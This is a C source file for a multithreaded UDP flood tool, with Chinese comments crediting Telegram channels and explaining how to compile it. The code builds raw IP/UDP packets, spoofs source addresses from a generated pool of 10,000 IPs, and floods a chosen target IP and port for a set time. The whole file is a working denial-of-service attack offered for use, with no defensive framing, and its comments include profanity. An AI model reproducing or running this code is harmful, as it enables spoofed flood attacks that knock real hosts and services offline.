/*
作者 https://t.me/sswc01
频道 https://t.me/sswcnet
功能 不会自己看？用不明白别用

编译 这都不会？
apt install gcc -y
gcc udpflood.c -o udpflood -pthread
./udpflood
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

// IP头部结构
struct pseudo_header {
   u_int32_t source_address;
   u_int32_t dest_address;
   u_int8_t placeholder;
   u_int8_t protocol;
   u_int16_t udp_length;
};

struct attack_params {
   const char *target;
   int port;
   int size;
   int time;
   unsigned int *ip_pool;
   int ip_count;
};

volatile int running = 1;

void handle_signal(int sig) {
   running = 0;
}

void get_network_range(const char *cidr, unsigned int *start_ip, unsigned int *end_ip) {
   char ip_str[16];
   int prefix;
   sscanf(cidr, "%[^/]/%d", ip_str, &prefix);
   
   struct in_addr addr;
   inet_pton(AF_INET, ip_str, &addr);
   unsigned int ip = ntohl(addr.s_addr);
   unsigned int mask = 0xffffffff << (32 - prefix);
   
   *start_ip = (ip & mask) + 1;
   *end_ip = (ip | ~mask) - 1;
}

// 根据子网生成ip，子网文件自己他妈找
unsigned int* generate_ip_pool(const char *filename, int target_count) {
   FILE *file = fopen(filename, "r");
   if (!file) {
       perror("Error opening zone file");
       exit(1);
   }

   unsigned int *ip_pool = malloc(target_count * sizeof(unsigned int));
   int generated_count = 0;
   char line[256];
   
   unsigned long long total_available_ips = 0;
   char **networks = malloc(1000 * sizeof(char*));
   int network_count = 0;
   
   while (fgets(line, sizeof(line), file) && network_count < 1000) {
       line[strcspn(line, "\n")] = 0;
       if (strlen(line) > 0) {
           networks[network_count] = strdup(line);
           unsigned int start_ip, end_ip;
           get_network_range(line, &start_ip, &end_ip);
           total_available_ips += end_ip - start_ip + 1;
           network_count++;
       }
   }
   
   for(int i = 0; i < network_count && generated_count < target_count; i++) {
       unsigned int start_ip, end_ip;
       get_network_range(networks[i], &start_ip, &end_ip);
       unsigned int available_ips = end_ip - start_ip + 1;
       
       int quota = (double)available_ips / total_available_ips * target_count;
       if(quota == 0) quota = 1;
       
       for(int j = 0; j < quota && generated_count < target_count; j++) {
           unsigned int random_offset = rand() % available_ips;
           ip_pool[generated_count] = htonl(start_ip + random_offset);
           generated_count++;
       }
       
       free(networks[i]);
   }
   
   free(networks);
   fclose(file);

   if(generated_count < target_count) {
       rewind(file);
       while(generated_count < target_count && network_count > 0) {
           int net_index = rand() % network_count;
           char line[256];
           int current_net = 0;
           
           rewind(file);
           while(fgets(line, sizeof(line), file)) {
               if(current_net == net_index) {
                   line[strcspn(line, "\n")] = 0;
                   unsigned int start_ip, end_ip;
                   get_network_range(line, &start_ip, &end_ip);
                   unsigned int available_ips = end_ip - start_ip + 1;
                   
                   unsigned int random_offset = rand() % available_ips;
                   ip_pool[generated_count] = htonl(start_ip + random_offset);
                   generated_count++;
                   break;
               }
               current_net++;
           }
       }
   }

   printf("Generated %d IPs from %d networks\n", generated_count, network_count);
   return ip_pool;
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
   register long sum = 0;
   unsigned short oddbyte;
   register short answer;

   while (nbytes > 1) {
       sum += *ptr++;
       nbytes -= 2;
   }
   if (nbytes == 1) {
       oddbyte = 0;
       *((u_char*)&oddbyte) = *(u_char*)ptr;
       sum += oddbyte;
   }

   sum = (sum >> 16) + (sum & 0xffff);
   sum = sum + (sum >> 16);
   answer = (short)~sum;
   
   return answer;
}

void *flood(void *arg) {
   struct attack_params *params = (struct attack_params*)arg;
   
   int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
   if (sock < 0) {
       perror("Socket creation error");
       return NULL;
   }

   int one = 1;
   if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
       perror("Error setting IP_HDRINCL");
       close(sock);
       return NULL;
   }

   // 设置socket缓冲区
   int buf_size = 65535;
   setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));

   char *packet = malloc(65536);
   struct iphdr *iph = (struct iphdr *)packet;
   struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
   char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
   
   int payload_size = params->size == 0 ? (rand() % 1361 + 40) : params->size;
   for(int i = 0; i < payload_size; i++) {
       data[i] = rand() % 255;
   }

   struct sockaddr_in sin;
   sin.sin_family = AF_INET;
   sin.sin_port = htons(params->port == 0 ? (rand() % 65535 + 1) : params->port);
   sin.sin_addr.s_addr = inet_addr(params->target);

   iph->ihl = 5;
   iph->version = 4;
   iph->tos = 0;
   iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + payload_size;
   iph->frag_off = 0;
   iph->ttl = 255;
   iph->protocol = IPPROTO_UDP;
   iph->daddr = sin.sin_addr.s_addr;

   udph->len = htons(sizeof(struct udphdr) + payload_size);
   udph->check = 0;

   time_t start_time = time(NULL);
   
   while(running && (params->time == 0 || time(NULL) - start_time < params->time)) {
       udph->source = htons(rand() % 65535 + 1);
       udph->dest = sin.sin_port;
       
       iph->saddr = params->ip_pool[rand() % params->ip_count];
       
       iph->check = 0;
       iph->check = checksum((unsigned short *)iph, sizeof(struct iphdr));

       if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
           continue;
       }
   }

   free(packet);
   close(sock);
   return NULL;
}

int main(int argc, char *argv[]) {
   if (argc != 7) {
       fprintf(stderr, "Usage: %s <target> <port> <size> <threads> <time> <zone_file>\n", argv[0]);
       exit(1);
   }

   srand(time(NULL));

   struct attack_params params;
   params.target = argv[1];
   params.port = atoi(argv[2]);
   params.size = atoi(argv[3]);
   int threads = atoi(argv[4]);
   params.time = atoi(argv[5]);
   
   params.ip_pool = generate_ip_pool(argv[6], 10000);  // 生成1万个IP
   params.ip_count = 10000;

   signal(SIGINT, handle_signal);

   pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
   printf("Starting flood...\n");
   //启动尼玛发包线程 操你妈逼
   for(int i = 0; i < threads; i++) {
       if(pthread_create(&thread_ids[i], NULL, flood, &params) != 0) {
           fprintf(stderr, "Failed to create thread %d\n", i);
           continue;
       }
   }

   for(int i = 0; i < threads; i++) {
       pthread_join(thread_ids[i], NULL);
   }

   free(params.ip_pool);
   free(thread_ids);
   //草泥马打完了
   printf("\nFlood completed\n");
   return 0;
}
